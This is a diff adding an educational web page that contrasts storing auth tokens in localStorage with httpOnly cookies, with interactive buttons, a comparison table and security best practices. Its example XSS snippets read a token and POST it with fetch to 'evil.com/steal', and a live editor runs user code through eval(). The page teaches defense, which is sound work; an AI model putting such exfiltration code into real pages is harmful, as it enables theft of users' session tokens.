@@ -1,0 +1,728 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>🍪 Cookie vs localStorage Security Demo</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            padding: 20px;
+            min-height: 100vh;
+        }
+
+        .container {
+            max-width: 1400px;
+            margin: 0 auto;
+        }
+
+        header {
+            text-align: center;
+            color: white;
+            margin-bottom: 30px;
+        }
+
+        h1 {
+            font-size: 2.5em;
+            margin-bottom: 10px;
+            text-shadow: 2px 2px 4px rgba(0,0,0,0.3);
+        }
+
+        .subtitle {
+            font-size: 1.1em;
+            opacity: 0.9;
+        }
+
+        .comparison {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 20px;
+            margin-bottom: 30px;
+        }
+
+        @media (max-width: 968px) {
+            .comparison {
+                grid-template-columns: 1fr;
+            }
+        }
+
+        .panel {
+            background: white;
+            border-radius: 12px;
+            padding: 30px;
+            box-shadow: 0 10px 40px rgba(0,0,0,0.2);
+        }
+
+        .panel.vulnerable {
+            border-top: 5px solid #f44336;
+        }
+
+        .panel.secure {
+            border-top: 5px solid #4caf50;
+        }
+
+        .panel h2 {
+            margin-bottom: 20px;
+            font-size: 1.8em;
+        }
+
+        .panel.vulnerable h2 {
+            color: #f44336;
+        }
+
+        .panel.secure h2 {
+            color: #4caf50;
+        }
+
+        .status-badge {
+            display: inline-block;
+            padding: 6px 12px;
+            border-radius: 6px;
+            font-size: 0.85em;
+            font-weight: bold;
+            margin-left: 10px;
+        }
+
+        .status-vulnerable {
+            background: #ffebee;
+            color: #c62828;
+        }
+
+        .status-secure {
+            background: #e8f5e9;
+            color: #2e7d32;
+        }
+
+        button {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            border: none;
+            padding: 12px 24px;
+            border-radius: 8px;
+            cursor: pointer;
+            font-size: 0.95em;
+            margin: 5px;
+            transition: all 0.3s;
+            font-weight: 500;
+        }
+
+        button:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 5px 15px rgba(102, 126, 234, 0.4);
+        }
+
+        button.attack {
+            background: linear-gradient(135deg, #f44336 0%, #c62828 100%);
+        }
+
+        button.attack:hover {
+            box-shadow: 0 5px 15px rgba(244, 67, 54, 0.4);
+        }
+
+        .code-display {
+            background: #1e1e1e;
+            color: #d4d4d4;
+            padding: 20px;
+            border-radius: 8px;
+            font-family: 'Courier New', monospace;
+            font-size: 0.9em;
+            margin: 15px 0;
+            overflow-x: auto;
+            line-height: 1.6;
+        }
+
+        .code-display .keyword {
+            color: #569cd6;
+        }
+
+        .code-display .string {
+            color: #ce9178;
+        }
+
+        .code-display .comment {
+            color: #6a9955;
+        }
+
+        .code-display .function {
+            color: #dcdcaa;
+        }
+
+        .output-box {
+            background: #f5f5f5;
+            border: 2px solid #ddd;
+            border-radius: 8px;
+            padding: 20px;
+            margin: 15px 0;
+            min-height: 100px;
+            font-family: monospace;
+            white-space: pre-wrap;
+            word-break: break-all;
+        }
+
+        .output-box.success {
+            border-color: #4caf50;
+            background: #e8f5e9;
+            color: #2e7d32;
+        }
+
+        .output-box.error {
+            border-color: #f44336;
+            background: #ffebee;
+            color: #c62828;
+        }
+
+        .diagram {
+            background: #f8f9fa;
+            border: 2px solid #dee2e6;
+            border-radius: 8px;
+            padding: 20px;
+            margin: 20px 0;
+            text-align: center;
+        }
+
+        .flow-step {
+            background: white;
+            border: 2px solid #667eea;
+            border-radius: 8px;
+            padding: 15px;
+            margin: 10px auto;
+            max-width: 400px;
+            position: relative;
+        }
+
+        .flow-step::after {
+            content: "↓";
+            display: block;
+            margin: 10px auto 0;
+            font-size: 1.5em;
+            color: #667eea;
+        }
+
+        .flow-step:last-child::after {
+            display: none;
+        }
+
+        .flow-step.blocked {
+            border-color: #f44336;
+            background: #ffebee;
+        }
+
+        .flow-step.success {
+            border-color: #4caf50;
+            background: #e8f5e9;
+        }
+
+        .info-box {
+            background: #e3f2fd;
+            border-left: 4px solid #2196f3;
+            padding: 15px;
+            margin: 15px 0;
+            border-radius: 4px;
+        }
+
+        .warning-box {
+            background: #fff3e0;
+            border-left: 4px solid #ff9800;
+            padding: 15px;
+            margin: 15px 0;
+            border-radius: 4px;
+        }
+
+        .editor-section {
+            margin: 20px 0;
+        }
+
+        textarea.code-editor {
+            width: 100%;
+            min-height: 150px;
+            background: #1e1e1e;
+            color: #d4d4d4;
+            border: 2px solid #333;
+            border-radius: 8px;
+            padding: 15px;
+            font-family: 'Courier New', monospace;
+            font-size: 0.9em;
+            line-height: 1.6;
+        }
+
+        .section-divider {
+            margin: 30px 0;
+            border: none;
+            border-top: 2px dashed #ddd;
+        }
+
+        h3 {
+            color: #333;
+            margin: 20px 0 10px;
+            font-size: 1.3em;
+        }
+
+        .highlight {
+            background: #ffeb3b;
+            padding: 2px 6px;
+            border-radius: 3px;
+            font-weight: bold;
+        }
+
+        .comparison-table {
+            width: 100%;
+            background: white;
+            border-radius: 12px;
+            padding: 20px;
+            margin: 20px 0;
+            box-shadow: 0 5px 20px rgba(0,0,0,0.1);
+        }
+
+        .comparison-table table {
+            width: 100%;
+            border-collapse: collapse;
+        }
+
+        .comparison-table th {
+            background: #667eea;
+            color: white;
+            padding: 15px;
+            text-align: left;
+            font-weight: 600;
+        }
+
+        .comparison-table td {
+            padding: 15px;
+            border-bottom: 1px solid #eee;
+        }
+
+        .comparison-table tr:last-child td {
+            border-bottom: none;
+        }
+
+        .check {
+            color: #4caf50;
+            font-weight: bold;
+        }
+
+        .cross {
+            color: #f44336;
+            font-weight: bold;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <header>
+            <h1>🍪 Cookie vs localStorage: Security Comparison</h1>
+            <p class="subtitle">Understanding why httpOnly cookies are more secure for authentication tokens</p>
+        </header>
+
+        <div class="comparison">
+            <!-- localStorage Panel -->
+            <div class="panel vulnerable">
+                <h2>
+                    ❌ localStorage
+                    <span class="status-badge status-vulnerable">VULNERABLE</span>
+                </h2>
+
+                <div class="info-box">
+                    <strong>How it works:</strong> JavaScript stores and retrieves data freely
+                </div>
+
+                <h3>1. Store Token</h3>
+                <div class="code-display">
+<span class="comment">// User logs in, receive token</span>
+<span class="keyword">const</span> token = <span class="string">"eyJhbGc..."</span>;
+localStorage.<span class="function">setItem</span>(<span class="string">'auth_token'</span>, token);
+                </div>
+
+                <button onclick="storeInLocalStorage()">Store Token in localStorage</button>
+                <div id="localStorageStatus" class="output-box"></div>
+
+                <hr class="section-divider">
+
+                <h3>2. XSS Attack (Malicious Script)</h3>
+                <div class="code-display">
+<span class="comment">// Attacker injects this via XSS:</span>
+<span class="keyword">const</span> stolen = localStorage.<span class="function">getItem</span>(<span class="string">'auth_token'</span>);
+<span class="function">fetch</span>(<span class="string">'https://evil.com/steal'</span>, {
+    method: <span class="string">'POST'</span>,
+    body: stolen
+});
+<span class="comment">// ⚠️ Token successfully stolen!</span>
+                </div>
+
+                <button class="attack" onclick="stealFromLocalStorage()">🕵️ Steal Token (XSS)</button>
+                <div id="localStorageAttack" class="output-box"></div>
+
+                <hr class="section-divider">
+
+                <h3>Visual Flow</h3>
+                <div class="diagram">
+                    <div class="flow-step">
+                        User logs in → Token stored in localStorage
+                    </div>
+                    <div class="flow-step">
+                        Attacker injects malicious script (XSS)
+                    </div>
+                    <div class="flow-step">
+                        Script reads localStorage.getItem('auth_token')
+                    </div>
+                    <div class="flow-step success" style="border-color: #f44336; background: #ffebee;">
+                        ⚠️ Token stolen! Sent to attacker's server
+                    </div>
+                </div>
+
+                <div class="warning-box">
+                    <strong>⚠️ Why This is Dangerous:</strong><br>
+                    Any JavaScript code (including injected XSS) can read localStorage. One successful XSS attack = complete account takeover.
+                </div>
+            </div>
+
+            <!-- httpOnly Cookie Panel -->
+            <div class="panel secure">
+                <h2>
+                    ✅ httpOnly Cookie
+                    <span class="status-badge status-secure">SECURE</span>
+                </h2>
+
+                <div class="info-box">
+                    <strong>How it works:</strong> Server sets cookie, JavaScript CANNOT access it
+                </div>
+
+                <h3>1. Server Sets Cookie</h3>
+                <div class="code-display">
+<span class="comment">// Server response header (FastAPI/backend):</span>
+Set-Cookie: auth_token=eyJhbGc...; <span class="highlight">HttpOnly</span>; Secure; SameSite=Strict
+
+<span class="comment">// JavaScript cannot set httpOnly cookies!</span>
+<span class="comment">// Only the server can via response headers</span>
+                </div>
+
+                <button onclick="simulateHttpOnlyCookie()">Simulate Server Setting Cookie</button>
+                <div id="cookieStatus" class="output-box"></div>
+
+                <hr class="section-divider">
+
+                <h3>2. XSS Attack Attempt (BLOCKED)</h3>
+                <div class="code-display">
+<span class="comment">// Attacker tries the same attack:</span>
+<span class="keyword">const</span> stolen = <span class="function">document.cookie</span>;
+<span class="comment">// Returns: "" (empty) or other non-httpOnly cookies</span>
+<span class="comment">// httpOnly cookies are NOT accessible!</span>
+
+<span class="function">fetch</span>(<span class="string">'https://evil.com/steal'</span>, {
+    method: <span class="string">'POST'</span>,
+    body: stolen  <span class="comment">// ✅ No auth token here!</span>
+});
+                </div>
+
+                <button class="attack" onclick="tryStealCookie()">🕵️ Try Steal Token (BLOCKED)</button>
+                <div id="cookieAttack" class="output-box"></div>
+
+                <hr class="section-divider">
+
+                <h3>Visual Flow</h3>
+                <div class="diagram">
+                    <div class="flow-step">
+                        User logs in → Server sets httpOnly cookie
+                    </div>
+                    <div class="flow-step">
+                        Attacker injects malicious script (XSS)
+                    </div>
+                    <div class="flow-step">
+                        Script tries document.cookie
+                    </div>
+                    <div class="flow-step blocked">
+                        🛡️ BLOCKED! httpOnly flag prevents JavaScript access
+                    </div>
+                    <div class="flow-step success">
+                        ✅ Token remains safe, user account protected
+                    </div>
+                </div>
+
+                <div class="info-box" style="background: #e8f5e9; border-left-color: #4caf50;">
+                    <strong>✅ Why This is Secure:</strong><br>
+                    The httpOnly flag makes the cookie invisible to JavaScript. Even with XSS, attackers cannot read the token. Browser still sends it automatically with requests!
+                </div>
+            </div>
+        </div>
+
+        <!-- Comparison Table -->
+        <div class="comparison-table">
+            <h2 style="margin-bottom: 20px; color: #333;">Feature Comparison</h2>
+            <table>
+                <thead>
+                    <tr>
+                        <th>Feature</th>
+                        <th>localStorage</th>
+                        <th>httpOnly Cookie</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    <tr>
+                        <td><strong>JavaScript Access</strong></td>
+                        <td><span class="cross">✗</span> Fully accessible</td>
+                        <td><span class="check">✓</span> Blocked</td>
+                    </tr>
+                    <tr>
+                        <td><strong>XSS Protection</strong></td>
+                        <td><span class="cross">✗</span> Vulnerable</td>
+                        <td><span class="check">✓</span> Protected</td>
+                    </tr>
+                    <tr>
+                        <td><strong>CSRF Protection</strong></td>
+                        <td><span class="check">✓</span> Not vulnerable</td>
+                        <td><span class="cross">✗</span> Needs CSRF tokens</td>
+                    </tr>
+                    <tr>
+                        <td><strong>Auto-sent with Requests</strong></td>
+                        <td><span class="cross">✗</span> Manual (headers)</td>
+                        <td><span class="check">✓</span> Automatic</td>
+                    </tr>
+                    <tr>
+                        <td><strong>Cross-domain</strong></td>
+                        <td><span class="check">✓</span> Any domain</td>
+                        <td><span class="cross">✗</span> Same-site (with SameSite)</td>
+                    </tr>
+                    <tr>
+                        <td><strong>Storage Limit</strong></td>
+                        <td>~5-10 MB</td>
+                        <td>~4 KB per cookie</td>
+                    </tr>
+                    <tr>
+                        <td><strong>Expiration Control</strong></td>
+                        <td><span class="cross">✗</span> Manual cleanup</td>
+                        <td><span class="check">✓</span> Automatic (max-age)</td>
+                    </tr>
+                    <tr>
+                        <td><strong>Server-side Control</strong></td>
+                        <td><span class="cross">✗</span> Client-side only</td>
+                        <td><span class="check">✓</span> Server sets/validates</td>
+                    </tr>
+                </tbody>
+            </table>
+        </div>
+
+        <!-- Live Code Editor -->
+        <div class="comparison-table">
+            <h2 style="margin-bottom: 20px; color: #333;">🧪 Live Code Experiment</h2>
+            <p style="margin-bottom: 15px;">Try both approaches yourself! Edit the code and run it to see the difference.</p>
+
+            <div class="editor-section">
+                <h3>localStorage Experiment</h3>
+                <textarea class="code-editor" id="localStorageCode">// Try to access localStorage
+const token = 'secret_token_123';
+localStorage.setItem('test_token', token);
+
+// Attacker's code (XSS)
+const stolen = localStorage.getItem('test_token');
+console.log('Stolen token:', stolen);
+
+// Result: Token successfully stolen!</textarea>
+                <button onclick="runLocalStorageCode()">▶ Run Code</button>
+                <div id="localStorageCodeOutput" class="output-box"></div>
+            </div>
+
+            <div class="editor-section">
+                <h3>httpOnly Cookie Simulation</h3>
+                <textarea class="code-editor" id="cookieCode">// Server sets httpOnly cookie (backend code):
+// Set-Cookie: token=secret_token; HttpOnly
+
+// Attacker tries to steal (frontend XSS):
+const cookies = document.cookie;
+console.log('Cookies accessible:', cookies);
+
+// Result: httpOnly cookie NOT visible!
+// (Browser only sends it with HTTP requests)</textarea>
+                <button onclick="runCookieCode()">▶ Run Code</button>
+                <div id="cookieCodeOutput" class="output-box"></div>
+            </div>
+        </div>
+
+        <!-- Best Practices -->
+        <div class="comparison-table">
+            <h2 style="margin-bottom: 20px; color: #333;">🎯 Best Practices for Provider Search</h2>
+            
+            <div class="info-box">
+                <h3 style="margin-top: 0;">✅ DO:</h3>
+                <ul style="margin: 10px 0 10px 20px; line-height: 1.8;">
+                    <li>Use <strong>httpOnly cookies</strong> for authentication tokens</li>
+                    <li>Set <strong>Secure</strong> flag (HTTPS only)</li>
+                    <li>Use <strong>SameSite=Strict</strong> or <strong>Lax</strong></li>
+                    <li>Implement <strong>CSRF tokens</strong> with httpOnly cookies</li>
+                    <li>Set appropriate <strong>expiration times</strong></li>
+                    <li>Use <strong>Content Security Policy</strong> headers</li>
+                    <li>Sanitize and escape all user input</li>
+                </ul>
+            </div>
+
+            <div class="warning-box">
+                <h3 style="margin-top: 0;">❌ DON'T:</h3>
+                <ul style="margin: 10px 0 10px 20px; line-height: 1.8;">
+                    <li>Store auth tokens in <strong>localStorage</strong></li>
+                    <li>Store sensitive data in <strong>sessionStorage</strong></li>
+                    <li>Trust client-side validation alone</li>
+                    <li>Use cookies without <strong>httpOnly</strong> for auth</li>
+                    <li>Skip input sanitization</li>
+                    <li>Ignore CSRF protection with cookies</li>
+                </ul>
+            </div>
+
+            <div style="margin-top: 20px; padding: 20px; background: #f8f9fa; border-radius: 8px;">
+                <h3 style="margin-top: 0;">🏗️ Provider Search Implementation:</h3>
+                <p style="line-height: 1.8;">
+                    <strong>Authentication Flow:</strong><br>
+                    1. User authenticates via Supabase<br>
+                    2. Supabase manages tokens securely (combination of approaches)<br>
+                    3. FastAPI backend validates tokens on each request<br>
+                    4. CORS configured for specific origins only<br>
+                    5. Rate limiting prevents brute force attacks<br>
+                    6. All sensitive operations require re-authentication<br><br>
+
+                    <strong>Defense in Depth:</strong><br>
+                    • Content Security Policy headers<br>
+                    • Input validation on frontend AND backend<br>
+                    • SQL injection prevention (parameterized queries)<br>
+                    • Regular security audits and dependency updates<br>
+                    • Logging and monitoring for suspicious activity
+                </p>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // localStorage Demo Functions
+        function storeInLocalStorage() {
+            const token = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c2VyXzEyMyIsIm5hbWUiOiJUZXN0IFVzZXIifQ.abc123';
+            localStorage.setItem('auth_token', token);
+            
+            document.getElementById('localStorageStatus').className = 'output-box success';
+            document.getElementById('localStorageStatus').textContent = 
+                '✓ Token stored successfully!\n\n' +
+                'Key: auth_token\n' +
+                'Value: ' + token + '\n\n' +
+                'localStorage.getItem("auth_token") = "' + token + '"';
+        }
+
+        function stealFromLocalStorage() {
+            const stolen = localStorage.getItem('auth_token');
+            
+            if (!stolen) {
+                document.getElementById('localStorageAttack').className = 'output-box';
+                document.getElementById('localStorageAttack').textContent = 
+                    '⚠️ No token found. Store a token first using the button above.';
+                return;
+            }
+
+            document.getElementById('localStorageAttack').className = 'output-box error';
+            document.getElementById('localStorageAttack').textContent = 
+                '🚨 XSS ATTACK SUCCESSFUL!\n\n' +
+                'Malicious code executed:\n' +
+                'const stolen = localStorage.getItem("auth_token");\n' +
+                'fetch("https://evil.com/steal", { method: "POST", body: stolen });\n\n' +
+                'Stolen token: ' + stolen + '\n\n' +
+                '⚠️ Attacker now has full access to the user account!\n' +
+                '⚠️ They can make requests as this user!\n' +
+                '⚠️ This is why localStorage is DANGEROUS for auth tokens!';
+        }
+
+        // httpOnly Cookie Demo Functions
+        function simulateHttpOnlyCookie() {
+            document.getElementById('cookieStatus').className = 'output-box success';
+            document.getElementById('cookieStatus').textContent = 
+                '✓ Server set httpOnly cookie (simulated)\n\n' +
+                'Response Header:\n' +
+                'Set-Cookie: auth_token=eyJhbGc...; HttpOnly; Secure; SameSite=Strict; Max-Age=3600\n\n' +
+                'Flags explained:\n' +
+                '• HttpOnly = JavaScript cannot access\n' +
+                '• Secure = Only sent over HTTPS\n' +
+                '• SameSite=Strict = Only sent to same domain\n' +
+                '• Max-Age=3600 = Expires in 1 hour\n\n' +
+                'Browser stores this cookie securely.\n' +
+                'JavaScript: document.cookie will NOT show it!';
+        }
+
+        function tryStealCookie() {
+            const accessibleCookies = document.cookie;
+            
+            document.getElementById('cookieAttack').className = 'output-box success';
+            document.getElementById('cookieAttack').textContent = 
+                '✅ XSS ATTACK BLOCKED!\n\n' +
+                'Malicious code attempted:\n' +
+                'const stolen = document.cookie;\n' +
+                'fetch("https://evil.com/steal", { method: "POST", body: stolen });\n\n' +
+                'document.cookie result: "' + (accessibleCookies || '(empty)') + '"\n\n' +
+                '✅ httpOnly cookie is NOT accessible to JavaScript!\n' +
+                '✅ Even with XSS, the auth token remains safe!\n' +
+                '✅ Browser still sends it with HTTP requests automatically!\n' +
+                '✅ User account protected! 🛡️\n\n' +
+                'Note: You can\'t see it here because httpOnly cookies\n' +
+                'can only be set by the server, not client JavaScript.\n' +
+                'But in production, JavaScript simply cannot access them.';
+        }
+
+        // Live Code Editor Functions
+        function runLocalStorageCode() {
+            const code = document.getElementById('localStorageCode').value;
+            const output = document.getElementById('localStorageCodeOutput');
+            
+            try {
+                // Capture console.log
+                const logs = [];
+                const originalLog = console.log;
+                console.log = (...args) => {
+                    logs.push(args.join(' '));
+                    originalLog(...args);
+                };
+
+                // Execute code
+                eval(code);
+
+                // Restore console.log
+                console.log = originalLog;
+
+                output.className = 'output-box error';
+                output.textContent = 
+                    '🚨 Code executed successfully!\n\n' +
+                    'Console output:\n' +
+                    logs.join('\n') + '\n\n' +
+                    '⚠️ This demonstrates the XSS vulnerability!\n' +
+                    'Any JavaScript code can access localStorage.';
+            } catch (error) {
+                output.className = 'output-box error';
+                output.textContent = 'Error: ' + error.message;
+            }
+        }
+
+        function runCookieCode() {
+            const output = document.getElementById('cookieCodeOutput');
+            
+            // Simulate the scenario
+            const cookies = document.cookie;
+            
+            output.className = 'output-box success';
+            output.textContent = 
+                '✅ Code executed\n\n' +
+                'Console output:\n' +
+                'Cookies accessible: "' + (cookies || '(empty)') + '"\n\n' +
+                '✅ httpOnly cookies are NOT visible here!\n' +
+                '✅ Even though this code runs, it cannot steal the auth token.\n' +
+                '✅ The httpOnly flag protects it from JavaScript access.\n\n' +
+                'In a real scenario with httpOnly cookies set by the server,\n' +
+                'document.cookie would return only non-httpOnly cookies.';
+        }
+
+        // Initialize
+        document.getElementById('localStorageStatus').textContent = 'Click "Store Token" to begin...';
+        document.getElementById('localStorageAttack').textContent = 'Click "Steal Token" after storing to see the attack...';
+        document.getElementById('cookieStatus').textContent = 'Click "Simulate Server Setting Cookie" to begin...';
+        document.getElementById('cookieAttack').textContent = 'Click "Try Steal Token" to see protection in action...';
+        document.getElementById('localStorageCodeOutput').textContent = 'Click "Run Code" to execute...';
+        document.getElementById('cookieCodeOutput').textContent = 'Click "Run Code" to execute...';
+    </script>
+</body>
+</html>
